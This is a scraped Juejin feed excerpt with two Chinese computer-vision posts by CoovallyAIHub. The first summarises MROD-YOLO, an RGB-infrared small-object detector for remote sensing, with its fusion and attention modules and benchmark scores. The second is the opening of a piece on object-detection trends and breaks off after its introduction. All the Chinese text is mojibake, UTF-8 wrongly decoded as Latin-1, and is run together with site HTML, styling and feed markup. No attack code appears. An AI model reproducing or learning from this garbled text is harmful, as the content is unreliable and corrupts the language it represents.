<h2 data-id="heading-1"><strong>æ ¸å¿ƒåˆ›æ–°ç‚¹æ·±åº¦è§£æ</strong></h2>
<ul>
<li><strong>MJRNetï¼šå…¨å±€ä¸Šä¸‹æ–‡å¼•å¯¼çš„å¤šæ¨¡æ€èåˆ</strong></li>
</ul>
<p>ä¼ ç»Ÿæ—©æœŸèåˆæ–¹æ³•ï¼ˆå¦‚ç®€å•æ‹¼æ¥æˆ–åŠ æƒèåˆï¼‰æ— æ³•æœ‰æ•ˆå¤„ç†ä¸åŒæ¨¡æ€é—´çš„ç‰¹å¾å·®å¼‚ã€‚MJRNeté€šè¿‡å…¨å±€ä¸Šä¸‹æ–‡æ³¨æ„åŠ›æœºåˆ¶ï¼ˆGCBï¼‰å®ç°æ¨¡æ€ç‰¹å¾çš„åŠ¨æ€åŠ æƒã€‚</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/98f475b394aa42629c24e5a5d61ed9e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878027&amp;x-signature=n5ZpinejmPmM1ZHqja3Ft%2FsqUFk%3D" alt="å›¾ç‰‡3.png" loading="lazy"/></p>
<p>å…³é”®æŠ€æœ¯ç»†èŠ‚ï¼š</p>
<ul>
<li><strong>åŒæ¨¡æ€ç‰¹å¾å¢å¼ºï¼š</strong> RGBå’Œçº¢å¤–å›¾åƒåˆ†åˆ«é€šè¿‡GCBæ¨¡å—æ•è·å…¨å±€ä¸Šä¸‹æ–‡ä¿¡æ¯</li>
<li><strong>ç©ºé—´æ©ç ç”Ÿæˆï¼š</strong> é€šè¿‡1Ã—1å·ç§¯ç”Ÿæˆæ¨¡æ€ç‰¹å¼‚æ€§æ©ç ï¼Œçªå‡ºå…³é”®ç©ºé—´åŒºåŸŸ</li>
<li><strong>æ®‹å·®èåˆæœºåˆ¶ï¼š</strong> åŠ æƒç‰¹å¾ä¸åŸå§‹ç‰¹å¾é€šè¿‡æ®‹å·®è¿æ¥ç»“åˆï¼Œä¿ç•™ç»†èŠ‚ä¿¡æ¯</li>
<li><strong>é€šé“æ³¨æ„åŠ›ä¼˜åŒ–ï¼š</strong> èåˆç‰¹å¾å†ç»GCBæ¨¡å—è°ƒæ•´é€šé“æƒé‡ï¼Œå®ç°ç²¾ç»†åŒ–èåˆ</li>
</ul>
<p>å®éªŒæ•°æ®æ˜¾ç¤ºï¼Œä¸ç®€å•æ‹¼æ¥çš„æ—©æœŸèåˆç›¸æ¯”ï¼ŒMJRNetåœ¨mAP50æŒ‡æ ‡ä¸Šæå‡1.8%ï¼ŒåŒæ—¶ä¿æŒç›¸è¿‘çš„è®¡ç®—å¼€é”€ã€‚</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/db9b3d709a194d67b127d32ee3af640b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878027&amp;x-signature=ghQxRDzIcfxnZaLC%2FPgHR1DNTOk%3D" alt="å›¾ç‰‡4.png" loading="lazy"/></p>
<ul>
<li><strong>éª¨å¹²ç½‘ç»œåŒé‡å¢å¼ºï¼šæ„Ÿå—é‡æ‰©å±•+ç©ºé—´æ³¨æ„åŠ›</strong></li>
</ul>
<p>ä¸ºæå‡å°ç›®æ ‡ç‰¹å¾æå–èƒ½åŠ›ï¼Œç ”ç©¶å›¢é˜Ÿå¯¹éª¨å¹²ç½‘ç»œè¿›è¡Œäº†ä¸¤é¡¹å…³é”®æ”¹è¿›ï¼š</p>
<p>2.1 æ„Ÿå—é‡æ‰©å±•æœºåˆ¶ï¼ˆRFEMï¼‰</p>
<p>é’ˆå¯¹é¥æ„Ÿå›¾åƒä¸­ç›®æ ‡èƒŒæ™¯å¤šå˜çš„ç‰¹ç‚¹ï¼ŒRFEMé€šè¿‡å¤šå°ºåº¦è§£è€¦æ·±åº¦å·ç§¯åŠ¨æ€è°ƒæ•´æ„Ÿå—é‡ï¼š</p>
<p>é‡‡ç”¨ä¸åŒæ ¸å¤§å°å’Œæ‰©å¼ ç‡çš„æ·±åº¦å·ç§¯æå–å¤šå°ºåº¦èƒŒæ™¯ä¿¡æ¯</p>
<p>é€šè¿‡ç©ºé—´æ³¨æ„åŠ›æœºåˆ¶è‡ªé€‚åº”é€‰æ‹©å…³é”®èƒŒæ™¯åŒºåŸŸ</p>
<p>å®éªŒè¯æ˜å¯ä½¿mAP50æå‡1.3%</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/38e066ebf71c4bf48ae4ee35a0ead373~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878027&amp;x-signature=wxslZ6lqxXFBbTQhlY0qEZm09Sc%3D" alt="å›¾ç‰‡5.png" loading="lazy"/></p>
<p>2.2 è·¨é˜¶æ®µéƒ¨åˆ†ç©ºé—´æ³¨æ„åŠ›ï¼ˆC2PSAï¼‰</p>
<p>å¢å¼ºç½‘ç»œå¯¹ç›®æ ‡åŒºåŸŸçš„å…³æ³¨èƒ½åŠ›ï¼š</p>
<p>åœ¨ç‰¹å¾å¤„ç†è¿‡ç¨‹ä¸­å¼•å…¥ç©ºé—´æ³¨æ„åŠ›æƒé‡</p>
<p>å¼ºåŒ–æœ‰ç”¨åŒºåŸŸç‰¹å¾ï¼ŒæŠ‘åˆ¶èƒŒæ™¯å¹²æ‰°</p>
<p>å•ç‹¬ä½¿ç”¨å¯ä½¿mAP50æå‡1.9%</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb60a5945a794591acc5aec45eef4818~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878027&amp;x-signature=bpzcf5%2FaX6ynnkd1RVDb0OzAUVI%3D" alt="å›¾ç‰‡6.png" loading="lazy"/></p>
<ul>
<li><strong>MSIAæ¨¡å—ï¼šè§£å†³å°ç›®æ ‡ç‰¹å¾ç¨€é‡Šé—®é¢˜</strong></li>
</ul>
<p>å°ç›®æ ‡ç‰¹å¾åœ¨æ·±å±‚ç½‘ç»œä¸­æ˜“è¢«ç¨€é‡Šæ˜¯æ£€æµ‹ç²¾åº¦ä¸‹é™çš„ä¸»è¦åŸå› ã€‚MSIAæ¨¡å—é€šè¿‡è¿­ä»£æ³¨æ„åŠ›èåˆç­–ç•¥è§£å†³è¿™ä¸€é—®é¢˜ï¼š</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/64953eac711b40ceadfb61c54d8a16a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878027&amp;x-signature=DVDHymtMEvoumFNMhafOm%2BoNbxI%3D" alt="å›¾ç‰‡7.png" loading="lazy"/></p>
<p>å·¥ä½œåŸç†ï¼š</p>
<ul>
<li>ç‰¹å¾åˆå§‹æ•´åˆï¼šå°†ä½çº§çº¹ç†ç‰¹å¾ä¸é«˜çº§è¯­ä¹‰ç‰¹å¾åˆæ­¥èåˆ</li>
<li>å¤šå°ºåº¦é€šé“æ³¨æ„åŠ›ï¼ˆMCAï¼‰ï¼šé€šè¿‡å…¨å±€ä¸å±€éƒ¨ä¸Šä¸‹æ–‡åˆ†æ”¯ç”Ÿæˆæ³¨æ„åŠ›æƒé‡</li>
<li>è¿­ä»£ä¼˜åŒ–ï¼šå¤šæ¬¡åº”ç”¨MCAæ¨¡å—ï¼Œé€æ­¥å¢å¼ºæœ‰ç”¨ç‰¹å¾é€šé“</li>
<li>åŠ¨æ€åŠ æƒèåˆï¼šæ ¹æ®æ³¨æ„åŠ›æƒé‡è°ƒæ•´é«˜ä½å±‚ç‰¹å¾è´¡çŒ®åº¦</li>
</ul>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6eb79737cef4963bea990e697734031~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878027&amp;x-signature=7OzjnV3UeboG%2BGK2KNyJGckH3wY%3D" alt="å›¾ç‰‡8.png" loading="lazy"/></p>
<p>è¿™ç§è¿­ä»£èšåˆç­–ç•¥ç¡®ä¿äº†å°ç›®æ ‡çš„ç»†ç²’åº¦ç‰¹å¾ä¸ä¼šè¢«é«˜çº§è¯­ä¹‰ç‰¹å¾æ©ç›–ï¼Œå®éªŒæ˜¾ç¤ºè¯¥æ¨¡å—å¯ä½¿mAP50æå‡0.9%ã€‚</p>
<ul>
<li><strong>è½»é‡åŒ–è®¾è®¡ï¼šç”¨FPNæ›¿ä»£PANet</strong></li>
</ul>
<p>ä¼ ç»ŸPANetç»“æ„é€šè¿‡å¤æ‚çš„ä¸Šä¸‹è·¯å¾„èšåˆç‰¹å¾ï¼Œä½†ä¼šå¼•å…¥å†—ä½™è®¡ç®—å¹¶ç¨€é‡Šå°ç›®æ ‡ç‰¹å¾ã€‚ç ”ç©¶å›¢é˜Ÿé‡‡ç”¨æ›´ç®€æ´çš„FPNæ›¿ä»£PANetï¼Œå¸¦æ¥åŒé‡æ”¶ç›Šï¼š</p>
<p>æ€§èƒ½æå‡ï¼šåœ¨MROD-YOLOxç‰ˆæœ¬ä¸­ï¼ŒmAP50ä»73.2%æå‡è‡³77.9%</p>
<p>æ•ˆç‡ä¼˜åŒ–ï¼šå‚æ•°æ•°é‡ä»54.50Må‡å°‘åˆ°45.35Mï¼ŒGFLOPsä»233.3é™è‡³227.3</p>
<p>FPNçš„ä¼˜åŠ¿åœ¨äºä¿æŒæµ…å±‚ç‰¹å¾çš„é«˜ç©ºé—´åˆ†è¾¨ç‡ï¼Œé¿å…å¤æ‚è·¯å¾„å¯¼è‡´çš„ç‰¹å¾ç¨€é‡Šï¼Œå‡å°‘è®¡ç®—èŠ‚ç‚¹ï¼Œæé«˜æ¨ç†é€Ÿåº¦ã€‚</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5f459040c4bf413bb9943c01c3657799~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878027&amp;x-signature=l%2F1zMTtxSWqimT46AshVmqPI45E%3D" alt="å›¾ç‰‡9.png" loading="lazy"/></p>
<h2 data-id="heading-2"><strong>å®éªŒéªŒè¯ï¼šå…¨é¢é¢†å…ˆç°æœ‰æ–¹æ³•</strong></h2>
<p>ç ”ç©¶å›¢é˜Ÿåœ¨VEDAIå’ŒDroneVehicleä¸¤ä¸ªå…¬å¼€æ•°æ®é›†ä¸Šè¿›è¡Œäº†å……åˆ†éªŒè¯ï¼Œç»“æœè¡¨æ˜MROD-YOLOåœ¨å¤šæ–¹é¢è¡¨ç°ä¼˜å¼‚ã€‚å®éªŒè¯æ˜ï¼Œå„ç»„ä»¶ååŒä½œç”¨å¯ä½¿mAP50æå‡7.1ä¸ªç™¾åˆ†ç‚¹ï¼Œå……åˆ†éªŒè¯äº†æ•´ä½“è®¾è®¡çš„åˆç†æ€§ã€‚</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1eca1869babb4da59a78bac429ebbb2a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878027&amp;x-signature=E%2FuzKHPuVrLzCho20angnWD6ozE%3D" alt="screenshot_2025-12-04_14-41-15.png" loading="lazy"/></p>
<ul>
<li><strong>ä¸ç°æœ‰æ–¹æ³•çš„å¯¹æ¯”</strong></li>
</ul>
<p>åœ¨VEDAIæ•°æ®é›†ä¸Šï¼ŒMROD-YOLOçš„mAP50è¾¾åˆ°77.9%ï¼Œè¶…è¿‡YOLOv10ï¼ˆ72.3%ï¼‰ã€CFTï¼ˆ73.7%ï¼‰ç­‰å…ˆè¿›æ–¹æ³•ï¼Œå°¤å…¶åœ¨å°ç›®æ ‡æ£€æµ‹ä¸Šä¼˜åŠ¿æ˜æ˜¾ã€‚</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cfd5aaabaca44b1bbb1119845c080854~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878027&amp;x-signature=qABv4OM%2FFzzGJsY42mTzvA719Dk%3D" alt="å›¾ç‰‡10.png" loading="lazy"/></p>
<p>åœ¨DroneVehicleæ— äººæœºæ•°æ®é›†ä¸Šï¼ŒMROD-YOLOçš„mAP50ä¸º70.4%ï¼ŒmAP50:95è¾¾52.7%ï¼Œå±•ç°å‡ºè‰¯å¥½çš„æ³›åŒ–èƒ½åŠ›ã€‚</p>
<ul>
<li><strong>å¤±è´¥æ¡ˆä¾‹åˆ†æ</strong></li>
</ul>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5cbebd3b4ca5412683b17afa461fa2e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878027&amp;x-signature=EYgEheRK9jXrZ2QO2Ym7SQ0zy74%3D" alt="å›¾ç‰‡11.png" loading="lazy"/></p>
<p>ç ”ç©¶ä¹Ÿå®¢è§‚åˆ†æäº†æ¨¡å‹çš„å±€é™æ€§ï¼š</p>
<ul>
<li>å¤–è§‚ç›¸ä¼¼çš„è½¿è½¦ä¸çš®å¡æ˜“æ··æ·†</li>
<li>å¤æ‚èƒŒæ™¯ï¼ˆèŒ‚å¯†æ¤è¢«ã€åŸå¸‚å»ºç­‘ï¼‰å¯èƒ½å¯¼è‡´æ¼æ£€</li>
<li>æç«¯å¤©æ°”æ¡ä»¶ä¸‹æ€§èƒ½ä¸‹é™</li>
</ul>
<p>è¿™äº›å‘ç°ä¸ºæœªæ¥ç ”ç©¶æŒ‡æ˜äº†æ–¹å‘ï¼ŒåŒ…æ‹¬æ›´ç²¾ç»†çš„ç‰¹å¾åŒºåˆ†æœºåˆ¶å’Œæ›´å¼ºçš„èƒŒæ™¯æŠ‘åˆ¶èƒ½åŠ›ã€‚</p>
<h2 data-id="heading-3"><strong>ç»“è¯­</strong></h2>
<p>MROD-YOLOé€šè¿‡åˆ›æ–°çš„å¤šæ¨¡æ€èåˆç­–ç•¥å’Œç‰¹å¾ä¼˜åŒ–æœºåˆ¶ï¼Œä¸ºé¥æ„Ÿå°ç›®æ ‡æ£€æµ‹æä¾›äº†æ–°çš„è§£å†³æ–¹æ¡ˆã€‚å…¶æ ¸å¿ƒä»·å€¼åœ¨äºï¼š</p>
<p>MJRNetå®ç°å¤šæ¨¡æ€ä¿¡æ¯çš„æ— æŸæ•´åˆï¼Œä¿ç•™å°ç›®æ ‡å…³é”®ç‰¹å¾ï¼›RFEMå’ŒMSIAæ¨¡å—åˆ†åˆ«ä»ç©ºé—´å’Œå°ºåº¦ç»´åº¦ä¼˜åŒ–ç‰¹å¾è¡¨ç¤ºï¼›å»é™¤å†—ä½™è®¡ç®—çš„åŒæ—¶æå‡æ£€æµ‹ç²¾åº¦ï¼Œé€‚åˆèµ„æºå—é™åœºæ™¯ã€‚</p>
<p>æœªæ¥ç ”ç©¶æ–¹å‘ï¼š1ï¼‰æ¢ç´¢è‡ªé€‚åº”èåˆç­–ç•¥åº”å¯¹æç«¯ç¯å¢ƒï¼›2ï¼‰è®¾è®¡æ›´è½»é‡çš„ç½‘ç»œç»“æ„æå‡éƒ¨ç½²çµæ´»æ€§ï¼›3ï¼‰å¢å¼ºæ¨¡å‹å¯¹å¯†é›†å°ç›®æ ‡çš„åˆ†è¾¨èƒ½åŠ›ã€‚</p>
<p>è¯¥ç ”ç©¶ä¸ä»…æ¨åŠ¨äº†é¥æ„Ÿç›®æ ‡æ£€æµ‹æŠ€æœ¯çš„å‘å±•ï¼Œä¹Ÿä¸ºå…¶ä»–é¢†åŸŸçš„å¤šæ¨¡æ€å°ç›®æ ‡æ£€æµ‹æä¾›äº†é‡è¦å€Ÿé‰´ã€‚éšç€æŠ€æœ¯çš„ä¸æ–­è¿­ä»£ï¼Œå®æ—¶é«˜ç²¾åº¦çš„é¥æ„Ÿç›‘æµ‹å°†åœ¨æ›´å¤šå®é™…åœºæ™¯ä¸­å¾—åˆ°åº”ç”¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æœªæ¥ç‰©ä½“æ£€æµ‹è¶‹åŠ¿ï¼šéœ€è¦å…³æ³¨çš„ 7 ä¸ªå…³é”®é—®é¢˜]]></title>    <link>https://juejin.cn/post/7581670270844420136</link>    <guid>https://juejin.cn/post/7581670270844420136</guid>    <pubDate>2025-12-09T09:45:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581670270844420136" data-draft-id="7581678301215997952" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æœªæ¥ç‰©ä½“æ£€æµ‹è¶‹åŠ¿ï¼šéœ€è¦å…³æ³¨çš„ 7 ä¸ªå…³é”®é—®é¢˜"/> <meta itemprop="keywords" content="ç®—æ³•,è®¡ç®—æœºè§†è§‰,æ·±åº¦å­¦ä¹ "/> <meta itemprop="datePublished" content="2025-12-09T09:45:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CoovallyAIHub"/> <meta itemprop="url" content="https://juejin.cn/user/2461151071843739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æœªæ¥ç‰©ä½“æ£€æµ‹è¶‹åŠ¿ï¼šéœ€è¦å…³æ³¨çš„ 7 ä¸ªå…³é”®é—®é¢˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2461151071843739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CoovallyAIHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T09:45:28.000Z" title="Tue Dec 09 2025 09:45:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è½¬çœ¼æ¥åˆ°2025å¹´12æœˆï¼Œè‡ªåŠ¨é©¾é©¶å‡ºç§Ÿè½¦å·²ç»å¼€ä¸Šè¡—å¤´ï¼Œäººä»¬ä¹Ÿä»åœ¨ç½‘ä¸Šæœç´¢ç­”æ¡ˆå˜æˆäº†æ—¥å¸¸ä¸AIèŠå¤©ã€‚è¿™äº›å˜åŒ–æ¸…æ¥šåœ°è¡¨æ˜ï¼Œäººå·¥æ™ºèƒ½ï¼ˆAIï¼‰æ­£ä»¥å‰æ‰€æœªæœ‰çš„é€Ÿåº¦å‘å±•ï¼Œå¹¶é€æ¸èå…¥æ—¥å¸¸ç”Ÿæ´»ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼Œè®¡ç®—æœºè§†è§‰æŠ€æœ¯å°±æ˜¯å…¶ä¸­ä¸€ä¸ªè¿›å±•æƒŠäººçš„é¢†åŸŸã€‚å®ƒä¹Ÿè¢«ç§°ä¸ºè§†è§‰AIï¼Œæ˜¯äººå·¥æ™ºèƒ½çš„ä¸€ä¸ªåˆ†æ”¯ï¼Œä¸»è¦è‡´åŠ›äºè®©æœºå™¨ç†è§£å’Œåˆ†æè§†è§‰æ•°æ®ã€‚</p>
<p>è®¡ç®—æœºè§†è§‰å·²ç»æ— å¤„ä¸åœ¨ï¼Œä»è¶…å¸‚çš„è‡ªåŠ¨æ”¶é“¶é€šé“ï¼Œåˆ°å·¡æŸ¥ç”µåŠ›çº¿çš„æ— äººæœºï¼ŒèƒŒåéƒ½æœ‰å®ƒçš„èº«å½±ã€‚è€Œè®¸å¤šè¿™ç±»ç³»ç»Ÿçš„æ ¸å¿ƒï¼Œå°±æ˜¯ç›®æ ‡æ£€æµ‹â€”â€”ä¸€é¡¹å…³é”®çš„è®¡ç®—æœºè§†è§‰ä»»åŠ¡ï¼Œè®©æœºå™¨èƒ½å¤Ÿè¯†åˆ«å¹¶å®šä½å›¾åƒå’Œè§†é¢‘ä¸­çš„ç‰¹å®šç‰©ä½“ã€‚</p>
<p>éšç€AIåº”ç”¨çš„åŠ é€Ÿæ™®åŠï¼Œå¸‚åœºå¯¹å¿«é€Ÿä¸”ç²¾å‡†çš„ç›®æ ‡æ£€æµ‹éœ€æ±‚ä¹Ÿåœ¨æ¿€å¢ã€‚åƒYOLO11ä»¥åŠå³å°†å‘å¸ƒçš„YOLO26è¿™æ ·çš„è§†è§‰AIæ¨¡å‹ï¼Œæ­£æ˜¯ä¸ºæ­¤è€Œç”Ÿï¼Œå®ƒä»¬è®©å®æ—¶ç›®æ ‡æ£€æµ‹å˜å¾—æ¯”ä»¥å¾€æ›´å¯é ã€æ›´æ˜“ç”¨ã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e444d9f3b9f64a929ca27638ad730aad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878328&amp;x-signature=9T2LylW1juNt1XT7kXARGcxPSc8%3D" alt="screenshot_2025-12-04_10-49-45.png" loading="lazy"/></p>
<p>åœ¨è¿™ä¸€å¿«é€Ÿå‘å±•çš„è¿›ç¨‹ä¸­ï¼Œæ•´ä¸ªé¢†åŸŸä¹Ÿåœ¨è¿…é€Ÿæ¼”å˜ï¼Œä¸€äº›æ–°å…´è¶‹åŠ¿æ­£åœ¨å¡‘é€ ä¸‹ä¸€ä»£ç›®æ ‡æ£€æµ‹æŠ€æœ¯çš„é¢è²Œã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†æ¢è®¨å®šä¹‰ç›®æ ‡æ£€æµ‹æœªæ¥çš„ä¸ƒä¸ªå…³é”®è¶‹åŠ¿ã€‚</p>
<h2 data-id="heading-0"><strong>äº†è§£ç›®æ ‡æ£€æµ‹çš„å·¥ä½œåŸç†</strong></h2>
